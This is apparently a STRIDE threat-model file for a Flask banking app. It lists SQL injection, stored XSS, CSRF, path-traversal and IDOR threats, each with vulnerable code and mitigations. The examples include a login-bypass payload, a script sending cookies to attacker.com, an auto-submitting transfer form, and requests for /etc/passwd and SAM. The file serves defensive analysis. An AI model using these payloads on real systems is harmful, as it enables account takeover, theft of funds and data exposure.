{
  "version": "2.5.0",
  "summary": {
    "title": "Banking System Security Analysis",
    "owner": "Trinh Xuan Khanh",
    "description": "Security threat analysis for a web-based banking application",
    "id": 0
  },
  "detail": {
    "contributors": [],
    "diagrams": [
      {
        "id": 0,
        "title": "Banking System Architecture",
        "diagramType": "STRIDE",
        "placeholder": "New STRIDE diagram description",
        "thumbnail": "./public/content/images/thumbnail.stride.jpg",
        "version": "2.5.0",
        "cells": [
          {
            "position": {
              "x": 80,
              "y": 130
            },
            "size": {
              "width": 112.5,
              "height": 60
            },
            "attrs": {
              "text": {
                "text": "Bank Customer"
              },
              "body": {
                "stroke": "#333333",
                "strokeWidth": 1.5,
                "strokeDasharray": null
              }
            },
            "visible": true,
            "shape": "actor",
            "ports": {
              "groups": {
                "top": {
                  "position": "top",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "right": {
                  "position": "right",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "bottom": {
                  "position": "bottom",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "left": {
                  "position": "left",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                }
              },
              "items": [
                {
                  "group": "top",
                  "id": "bd1e6adb-93b3-440b-9ede-291b079c52b5"
                },
                {
                  "group": "right",
                  "id": "abc02d46-fdfd-48f7-b349-f092db84735f"
                },
                {
                  "group": "bottom",
                  "id": "50914413-0e6f-44d1-817e-58f9147bade5"
                },
                {
                  "group": "left",
                  "id": "5226f5ad-bb5c-44e8-87a9-d9d7307ef5f0"
                }
              ]
            },
            "id": "71822cdc-974c-4f3d-b62b-b483113be1e7",
            "zIndex": 1,
            "data": {
              "type": "tm.Actor",
              "name": "Bank Customer",
              "description": "User accessing banking system via web browser",
              "isTrustBoundary": false,
              "outOfScope": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "providesAuthentication": false,
              "threats": []
            }
          },
          {
            "position": {
              "x": 590,
              "y": 320
            },
            "size": {
              "width": 170,
              "height": 180
            },
            "attrs": {
              "text": {
                "text": "Flask Web Application"
              },
              "body": {
                "stroke": "red",
                "strokeWidth": 2.5,
                "strokeDasharray": null
              }
            },
            "visible": true,
            "shape": "process",
            "ports": {
              "groups": {
                "top": {
                  "position": "top",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "right": {
                  "position": "right",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "bottom": {
                  "position": "bottom",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "left": {
                  "position": "left",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                }
              },
              "items": [
                {
                  "group": "top",
                  "id": "5d3cfff2-c939-465b-bcd7-d05132c7d458"
                },
                {
                  "group": "right",
                  "id": "f3f4c042-5834-4d51-b5cd-09f0faad800a"
                },
                {
                  "group": "bottom",
                  "id": "325e027e-255c-43f0-86e0-053b1ebb7d6f"
                },
                {
                  "group": "left",
                  "id": "ae024e28-62fe-4ccf-b17e-c4f197a48944"
                }
              ]
            },
            "id": "b4c3275f-114e-47a4-b790-895d1219c196",
            "zIndex": 2,
            "data": {
              "type": "tm.Process",
              "name": "Flask Web Application",
              "description": "Python Flask server handling authentication, transactions",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": true,
              "handlesCardPayment": false,
              "handlesGoodsOrServices": false,
              "isWebApplication": false,
              "privilegeLevel": "",
              "threats": [
                {
                  "id": "05e315e3-07b7-4a2c-b5ac-65fe7a35118d",
                  "title": "SQL Injection in Login Form",
                  "status": "Open",
                  "severity": "High",
                  "type": "Tampering",
                  "description": "Attacker can bypass authentication by injecting malicious SQL code into username or password fields. The vulnerable code uses string concatenation to build SQL queries, allowing attackers to manipulate the query logic.\n\nExample payload:\nUsername: admin' OR '1'='1\nPassword: anything\n\nVulnerable code:\nquery = f\"SELECT * FROM users WHERE username='{username}' AND password='{password}'\"\n\nAttack scenario:\n1. Attacker enters: admin' OR '1'='1 in username field\n2. SQL query becomes: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'\n3. Condition '1'='1' is always true, bypassing authentication\n4. Attacker gains unauthorized access to admin account\n5. Attacker can access all user accounts, view balances, transfer funds",
                  "mitigation": "1. Use parameterized queries (prepared statements) instead of string concatenation\n2. Implement input validation and sanitization\n3. Use ORM (Object-Relational Mapping) frameworks that handle SQL safely\n4. Apply principle of least privilege to database users\n5. Implement rate limiting on login attempts\n6. Log and monitor suspicious SQL patterns\n\nSecure code example:\ndb.execute('SELECT * FROM users WHERE username = ? AND password = ?', (username, password))",
                  "modelType": "STRIDE",
                  "new": false,
                  "number": 1,
                  "score": "high"
                },
                {
                  "id": "edce2685-c35b-49db-a769-0b33b90b929a",
                  "title": "Stored XSS in User Profile",
                  "status": "Open",
                  "severity": "High",
                  "type": "Tampering",
                  "description": "Attacker can inject malicious JavaScript into user profile fields (e.g., bio). The vulnerable code uses |safe filter in templates, allowing HTML/JavaScript to execute. The script is stored in the database and executes when any user views the profile, potentially stealing session cookies or performing unauthorized actions.\n\nExample payloads:\n<script>alert('XSS Attack!')</script>\n<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>\n<img src=x onerror=\"alert('XSS')\">\n\nVulnerable code:\n{{ g.user['bio']|safe }}\n\nAttack scenario:\n1. Attacker creates account\n2. Sets bio field to malicious script: <script>alert(document.cookie)</script>\n3. Script is stored in database without sanitization\n4. Admin or other users view attacker's profile\n5. Script executes in victim's browser, stealing session cookies\n6. Attacker uses stolen session to access victim's account and transfer funds",
                  "mitigation": "1. Remove |safe filter from templates - use automatic HTML escaping (Jinja2 default)\n2. Sanitize user input before storing in database using markupsafe.escape()\n3. Implement Content Security Policy (CSP) headers to prevent script execution\n4. Use whitelist-based HTML sanitization if HTML formatting is required\n5. Validate and sanitize all user-supplied data\n6. Implement output encoding based on context (HTML, JavaScript, URL)\n\nSecure code example:\nfrom markupsafe import escape\nbio = escape(bio)  # Escape HTML entities\n# In template: {{ g.user['bio'] }} (no |safe filter)",
                  "modelType": "STRIDE",
                  "new": false,
                  "number": 2,
                  "score": "high"
                },
                {
                  "id": "339b6713-3bcb-4bb0-8e11-c3e02b1fdd87",
                  "title": "CSRF in Money Transfer",
                  "status": "Open",
                  "severity": "High",
                  "type": "Spoofing",
                  "description": "Attacker tricks authenticated user into making unauthorized money transfers by visiting a malicious website that automatically submits a hidden form to the banking application. The vulnerable code lacks CSRF token validation, allowing any website to submit requests on behalf of authenticated users.\n\nExample attack:\nMalicious website (csrf_attack.html) contains:\n<form id=\"evil\" action=\"http://bankingapp.com/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"to_account\" value=\"ACC-1004\">\n  <input type=\"hidden\" name=\"amount\" value=\"500\">\n  <input type=\"hidden\" name=\"description\" value=\"Prize claim fee\">\n</form>\n<script>document.getElementById('evil').submit();</script>\n\nVulnerable code:\nNo CSRF token in form, no validation of request origin\n\nAttack scenario:\n1. User logs into banking app at localhost:5000 (session cookie active)\n2. User visits attacker's malicious website at localhost:8000/csrf_attack.html\n3. Malicious page contains hidden form targeting banking app\n4. Form automatically submits when page loads\n5. Browser sends request with user's session cookie (Same-Origin Policy allows)\n6. Banking app processes request without CSRF token validation\n7. $500 transferred to attacker's account (ACC-1004)\n8. User discovers unauthorized transaction later",
                  "mitigation": "1. Implement CSRF tokens in all state-changing forms (POST, PUT, DELETE)\n2. Use Flask-WTF CSRF protection module (CSRFProtect)\n3. Set SameSite cookie attribute to 'Strict' or 'Lax'\n4. Verify Referer and Origin headers\n5. Use double-submit cookie pattern\n6. Require re-authentication for sensitive operations (money transfers)\n7. Implement transaction confirmation via email/SMS\n\nSecure code example:\nfrom flask_wtf.csrf import CSRFProtect\ncsrf = CSRFProtect(app)\n# In template: <input type=\"hidden\" name=\"csrf_token\" value=\"{{ csrf_token() }}\"/>",
                  "modelType": "STRIDE",
                  "new": false,
                  "number": 3,
                  "score": "high"
                },
                {
                  "id": "d4e0bec6-e17d-4779-8a19-8a437f55819c",
                  "title": "Path Traversal in File Download",
                  "status": "Open",
                  "severity": "High",
                  "type": "Information disclosure",
                  "description": "The file download feature does not validate file paths. Attacker can access files outside the intended directory using path traversal sequences (../) to read sensitive files like source code, configuration files, or system files.\n\nExample payloads:\n/download?file=../app/schema.sql\n/download?file=../app/auth.py\n/download?file=../app/__init__.py\n/download?file=../../etc/passwd (Linux)\n/download?file=..\\..\\..\\Windows\\System32\\config\\SAM (Windows)\n\nVulnerable code:\nfilename = request.args.get('file', '')\nfilepath = os.path.join(base_dir, filename)  # No validation!\nreturn send_file(filepath, as_attachment=True)\n\nAttack scenario:\n1. Attacker discovers download endpoint: /download?file=<filename>\n2. Tests with: /download?file=../app/schema.sql\n3. Server constructs path: instance/../app/schema.sql = app/schema.sql\n4. Server returns database schema file\n5. Attacker tries: /download?file=../app/auth.py\n6. Downloads source code revealing SQL injection vulnerability\n7. Attacker uses knowledge to craft more sophisticated attacks\n8. Accesses configuration files with database credentials\n9. Directly connects to database and exfiltrates all customer financial data",
                  "mitigation": "1. Validate and sanitize all file paths using os.path.basename()\n2. Use whitelist of allowed filenames only\n3. Use secure_filename() from werkzeug.utils\n4. Verify absolute paths don't escape intended directory:\n   allowed_dir = os.path.abspath('/statements')\n   requested = os.path.abspath(os.path.join('/statements', filename))\n   if not requested.startswith(allowed_dir): abort(403)\n5. Store files outside web root directory\n6. Implement proper access control checks (user can only access their own files)\n7. Use file IDs instead of filenames in URLs\n8. Log all file access attempts for monitoring\n\nSecure code example:\nfilename = os.path.basename(request.args.get('file', ''))\nfilepath = os.path.abspath(os.path.join(statements_dir, filename))\nif not filepath.startswith(os.path.abspath(statements_dir)):\n    abort(403)",
                  "modelType": "STRIDE",
                  "new": false,
                  "number": 4,
                  "score": "high"
                },
                {
                  "id": "a8f2c9d1-4e5b-6c7d-8e9f-0a1b2c3d4e5f",
                  "title": "IDOR in Account Details",
                  "status": "Open",
                  "severity": "High",
                  "type": "Information disclosure",
                  "description": "The account details endpoint does not verify that the requested account belongs to the logged-in user. Attacker can access any user's account information by simply changing the account_id parameter in the URL, violating the principle of least privilege and account isolation.\n\nExample attack:\nLogged in as admin (account_id=1), attacker changes URL:\n/account/1 → Own account (legitimate)\n/account/2 → Alice's account (unauthorized access!)\n/account/3 → Bob's account (unauthorized access!)\n\nVulnerable code:\n@app.route('/account/<int:account_id>')\ndef account_details(account_id):\n    account = db.execute('SELECT * FROM accounts WHERE id = ?', (account_id,)).fetchone()\n    # No authorization check!\n    return render_template('account_details.html', account=account)\n\nAttack scenario:\n1. Attacker logs in as admin (user_id=1, account_id=1)\n2. Views own account: /account/1 (normal behavior)\n3. Manually changes URL to: /account/2 (Alice's account)\n4. System fetches account without checking ownership\n5. Attacker views Alice's account balance: $5,000\n6. Attacker views Alice's transaction history\n7. Attacker views Alice's personal information (email, full name)\n8. Attacker can enumerate all accounts by trying /account/3, /account/4, etc.\n9. Attacker builds complete database of all customers and their balances",
                  "mitigation": "1. Implement authorization check before displaying account data\n2. Verify account belongs to logged-in user: account['user_id'] == g.user['id']\n3. Return 403 Forbidden if authorization fails\n4. Use indirect object references (tokens/IDs) instead of direct database IDs\n5. Implement role-based access control (RBAC)\n6. Log all unauthorized access attempts\n7. Use account numbers instead of sequential IDs in URLs\n\nSecure code example:\naccount = db.execute('SELECT * FROM accounts WHERE id = ?', (account_id,)).fetchone()\nif account['user_id'] != g.user['id']:\n    flash('Access denied: You can only view your own account', 'error')\n    return redirect(url_for('dashboard'))",
                  "modelType": "STRIDE",
                  "new": false,
                  "number": 5,
                  "score": "high"
                }
              ],
              "threatFrequency": {
                "spoofing": 1,
                "tampering": 2,
                "repudiation": 0,
                "informationDisclosure": 2,
                "denialOfService": 0,
                "elevationOfPrivilege": 0
              }
            }
          },
          {
            "position": {
              "x": 953,
              "y": 320
            },
            "size": {
              "width": 120,
              "height": 60
            },
            "attrs": {
              "text": {
                "text": "SQLite Database"
              },
              "topLine": {
                "strokeWidth": 1.5,
                "strokeDasharray": null
              },
              "bottomLine": {
                "strokeWidth": 1.5,
                "strokeDasharray": null
              }
            },
            "visible": true,
            "shape": "store",
            "ports": {
              "groups": {
                "top": {
                  "position": "top",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "right": {
                  "position": "right",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "bottom": {
                  "position": "bottom",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "left": {
                  "position": "left",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                }
              },
              "items": [
                {
                  "group": "top",
                  "id": "350ced10-7a91-4a2b-8761-c750305b2cbd"
                },
                {
                  "group": "right",
                  "id": "e93d3eab-8d72-4b8f-b6fa-6af55f0ec692"
                },
                {
                  "group": "bottom",
                  "id": "63b226ae-35ee-4987-bd95-495dfd448978"
                },
                {
                  "group": "left",
                  "id": "895ef018-8c06-4a30-8559-44288a6e4231"
                }
              ]
            },
            "id": "41301a5d-f576-4bec-83fc-2167d3482edc",
            "zIndex": 3,
            "data": {
              "type": "tm.Store",
              "name": "SQLite Database",
              "description": "Stores users, accounts, transactions",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isALog": false,
              "isEncrypted": false,
              "isSigned": false,
              "storesCredentials": true,
              "storesInventory": false,
              "threats": []
            }
          },
          {
            "shape": "trust-boundary-curve",
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Boundary",
              "name": "Stores users, accounts, transactions",
              "description": "",
              "isTrustBoundary": true,
              "hasOpenThreats": false
            },
            "labels": [
              "Stores users, accounts, transactions"
            ],
            "id": "c5b0fe4e-3b4e-4c16-8a9f-e430ff0ceb12",
            "source": {
              "x": 690,
              "y": 560
            },
            "target": {
              "x": 1080,
              "y": 520
            },
            "vertices": [
              {
                "x": 420,
                "y": 330
              },
              {
                "x": 560,
                "y": 230
              },
              {
                "x": 760,
                "y": 180
              },
              {
                "x": 1170,
                "y": 210
              }
            ]
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "#333333",
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "HTTP/HTTPS Requests",
              "description": "Login, transfer, profile requests",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isBidirectional": false,
              "isEncrypted": true,
              "isPublicNetwork": false,
              "protocol": "HTTPS",
              "threats": []
            },
            "labels": [
              "HTTP/HTTPS Requests"
            ],
            "id": "50d9bb25-4d7e-4428-a59f-ed8d7fea8517",
            "source": {
              "x": 140,
              "y": 190
            },
            "target": {
              "cell": "b4c3275f-114e-47a4-b790-895d1219c196",
              "port": "ae024e28-62fe-4ccf-b17e-c4f197a48944"
            },
            "vertices": [
              {
                "x": 150,
                "y": 410
              }
            ]
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "#333333",
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "SQL Queries",
              "description": "SELECT, INSERT, UPDATE operations",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": []
            },
            "labels": [
              "SQL Queries"
            ],
            "id": "37ca2e90-d1e7-4924-acdc-6b1c380f1760",
            "source": {
              "x": 760,
              "y": 410
            },
            "target": {
              "cell": "41301a5d-f576-4bec-83fc-2167d3482edc",
              "port": "895ef018-8c06-4a30-8559-44288a6e4231"
            },
            "vertices": [
              {
                "x": 830,
                "y": 390
              },
              {
                "x": 870,
                "y": 370
              }
            ]
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "#333333",
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "Query Results",
              "description": "User data, account balances",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": []
            },
            "labels": [
              "Query Results"
            ],
            "id": "4f0e2f28-209a-49f1-b79e-bb1415cf68f8",
            "source": {
              "cell": "41301a5d-f576-4bec-83fc-2167d3482edc",
              "port": "63b226ae-35ee-4987-bd95-495dfd448978"
            },
            "target": {
              "cell": "b4c3275f-114e-47a4-b790-895d1219c196",
              "port": "f3f4c042-5834-4d51-b5cd-09f0faad800a"
            },
            "vertices": [
              {
                "x": 880,
                "y": 410
              }
            ]
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "#333333",
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "HTTP Responses",
              "description": "HTML pages, JSON data",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isBidirectional": false,
              "isEncrypted": true,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": []
            },
            "labels": [
              "HTTP Responses"
            ],
            "id": "3b122cb8-17ed-4ccb-b57b-50b4d234e76f",
            "source": {
              "x": 590,
              "y": 410
            },
            "target": {
              "cell": "71822cdc-974c-4f3d-b62b-b483113be1e7",
              "port": "abc02d46-fdfd-48f7-b349-f092db84735f"
            }
          }
        ],
        "description": "Data flow diagram showing user, web app, and database"
      },
      {
        "id": 1,
        "title": "SQL INJECTION ATTACK THREAT MODEL",
        "diagramType": "STRIDE",
        "placeholder": "New STRIDE diagram description",
        "thumbnail": "./public/content/images/thumbnail.stride.jpg",
        "version": "2.5.0",
        "cells": [
          {
            "position": {
              "x": 520,
              "y": 10
            },
            "size": {
              "width": 960,
              "height": 490
            },
            "attrs": {
              "label": {
                "text": "HTTPS Trust Boundary"
              }
            },
            "visible": true,
            "shape": "trust-boundary-box",
            "id": "be7d7002-d3b5-4b9e-83c3-eef1a49a0881",
            "zIndex": -1,
            "data": {
              "type": "tm.BoundaryBox",
              "name": "HTTPS Trust Boundary",
              "description": "Security boundary between external browsers and internal application infrastructure",
              "isTrustBoundary": true,
              "hasOpenThreats": false
            }
          },
          {
            "position": {
              "x": 330,
              "y": 25
            },
            "size": {
              "width": 120,
              "height": 60
            },
            "attrs": {
              "text": {
                "text": "Attacker"
              },
              "body": {
                "stroke": "#333333",
                "strokeWidth": 1.5,
                "strokeDasharray": null
              }
            },
            "visible": true,
            "shape": "actor",
            "ports": {
              "groups": {
                "top": {
                  "position": "top",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "right": {
                  "position": "right",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "bottom": {
                  "position": "bottom",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "left": {
                  "position": "left",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                }
              },
              "items": [
                {
                  "group": "top",
                  "id": "1a52d721-2043-470f-916e-7b9e0299a66b"
                },
                {
                  "group": "right",
                  "id": "26b6ab31-e752-4a97-883a-91be2433584d"
                },
                {
                  "group": "bottom",
                  "id": "c25f8ca5-fdcb-49c3-aea3-4e9dc1509416"
                },
                {
                  "group": "left",
                  "id": "c5707bbd-f059-47e0-aa9a-27f7f2dce967"
                }
              ]
            },
            "id": "ac0a552a-84d4-4657-bb64-8ec10af73ed0",
            "zIndex": 1,
            "data": {
              "type": "tm.Actor",
              "name": "Attacker",
              "description": "Malicious external user attempting SQL injection attack to bypass authentication",
              "isTrustBoundary": false,
              "outOfScope": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "providesAuthentication": false,
              "threats": []
            }
          },
          {
            "position": {
              "x": 300,
              "y": 345
            },
            "size": {
              "width": 160,
              "height": 80
            },
            "attrs": {
              "text": {
                "text": "Bank Customer Browser"
              },
              "body": {
                "stroke": "#333333",
                "strokeWidth": 1.5,
                "strokeDasharray": null
              }
            },
            "visible": true,
            "shape": "actor",
            "ports": {
              "groups": {
                "top": {
                  "position": "top",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "right": {
                  "position": "right",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "bottom": {
                  "position": "bottom",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "left": {
                  "position": "left",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                }
              },
              "items": [
                {
                  "group": "top",
                  "id": "1a52d721-2043-470f-916e-7b9e0299a66b"
                },
                {
                  "group": "right",
                  "id": "26b6ab31-e752-4a97-883a-91be2433584d"
                },
                {
                  "group": "bottom",
                  "id": "c25f8ca5-fdcb-49c3-aea3-4e9dc1509416"
                },
                {
                  "group": "left",
                  "id": "c5707bbd-f059-47e0-aa9a-27f7f2dce967"
                }
              ]
            },
            "id": "dedcf4c0-3e7c-4492-9451-5db79c8f8803",
            "zIndex": 2,
            "data": {
              "type": "tm.Actor",
              "name": "Bank Customer Browser",
              "description": "Legitimate user's browser interface for accessing banking application",
              "isTrustBoundary": false,
              "outOfScope": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "providesAuthentication": false,
              "threats": []
            }
          },
          {
            "position": {
              "x": 717,
              "y": 110.00000000000006
            },
            "size": {
              "width": 260,
              "height": 250
            },
            "attrs": {
              "text": {
                "text": "Flask Web Application - Login Route"
              },
              "body": {
                "stroke": "red",
                "strokeWidth": 2.5,
                "strokeDasharray": null
              }
            },
            "visible": true,
            "shape": "process",
            "ports": {
              "groups": {
                "top": {
                  "position": "top",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "right": {
                  "position": "right",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "bottom": {
                  "position": "bottom",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "left": {
                  "position": "left",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                }
              },
              "items": [
                {
                  "group": "top",
                  "id": "09c79237-1bfa-4aca-94bf-11511a356e3a"
                },
                {
                  "group": "right",
                  "id": "3952c5eb-a031-45cf-8c52-dfb7358dd5a5"
                },
                {
                  "group": "bottom",
                  "id": "4c40a723-deb7-4901-849e-5b536f74a3d2"
                },
                {
                  "group": "left",
                  "id": "8dcaf22d-70d0-43f5-adad-49541a9c7c97"
                }
              ]
            },
            "id": "b8530cee-4bd5-402e-913a-c34ded2e31d1",
            "zIndex": 3,
            "data": {
              "type": "tm.Process",
              "name": "Flask Web Application - Login Route",
              "description": "Web application endpoint handling login authentication at /auth/login\n   \n   VULNERABLE: Uses string concatenation to build SQL queries instead of parameterized queries\n   \n   Code: query = f\"SELECT * FROM users WHERE username='{username}' AND password='{password}'\"",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": true,
              "handlesCardPayment": false,
              "handlesGoodsOrServices": false,
              "isWebApplication": true,
              "privilegeLevel": "",
              "threats": [
                {
                  "id": "c6e37d04-3080-41ce-9d19-088f25b8df7d",
                  "title": "Insufficient Input Validation and Sanitization",
                  "status": "Open",
                  "severity": "High",
                  "type": "Tampering",
                  "description": "VULNERABILITY:\nThe login endpoint does not validate or sanitize user inputs before using them in SQL queries.\n\nMISSING CONTROLS:\n- No input length validation\n- No character whitelisting\n- No SQL keyword blacklisting\n- No encoding of special characters\n- No prepared statements\n\nATTACK SURFACE:\n- Username field accepts any characters including SQL syntax\n- Password field similarly vulnerable\n- No CSRF token validation\n- No captcha for brute force prevention\n\nEXPLOITABLE BY:\n- SQL Injection (current threat)\n- XSS via stored username\n- Authentication bypass\n- Brute force attacks",
                  "mitigation": "INPUT VALIDATION:\n1. Whitelist Validation:\n   import re\n   if not re.match(r'^[a-zA-Z0-9_]{3,50}$', username):\n       return \"Invalid username format\"\n\n2. Length Limits:\n   - Username: 3-50 characters\n   - Password: 8-128 characters\n\n3. Character Encoding:\n   from html import escape\n   username = escape(username)\n\n4. SQL Keyword Detection:\n   sql_keywords = ['SELECT', 'DROP', 'INSERT', 'DELETE', 'UPDATE', 'UNION', 'OR', 'AND']\n   if any(keyword in username.upper() for keyword in sql_keywords):\n       return \"Invalid input detected\"\n\nADDITIONAL CONTROLS:\n5. CSRF Protection:\n   - Implement CSRF tokens\n   - Validate token on every POST request\n\n6. Rate Limiting:\n   from flask_limiter import Limiter\n   @limiter.limit(\"5 per minute\")\n   def login():\n       ...\n\n7. Captcha:\n   - Add reCAPTCHA after 3 failed attempts\n   - Prevent automated attacks",
                  "modelType": "STRIDE",
                  "new": false,
                  "number": 7,
                  "score": ""
                }
              ],
              "threatFrequency": {
                "spoofing": 0,
                "tampering": 1,
                "repudiation": 0,
                "informationDisclosure": 0,
                "denialOfService": 0,
                "elevationOfPrivilege": 0
              }
            }
          },
          {
            "position": {
              "x": 1309,
              "y": 210
            },
            "size": {
              "width": 120,
              "height": 50
            },
            "attrs": {
              "text": {
                "text": "SQLite Database"
              },
              "topLine": {
                "strokeWidth": 1.5,
                "strokeDasharray": null
              },
              "bottomLine": {
                "strokeWidth": 1.5,
                "strokeDasharray": null
              }
            },
            "visible": true,
            "shape": "store",
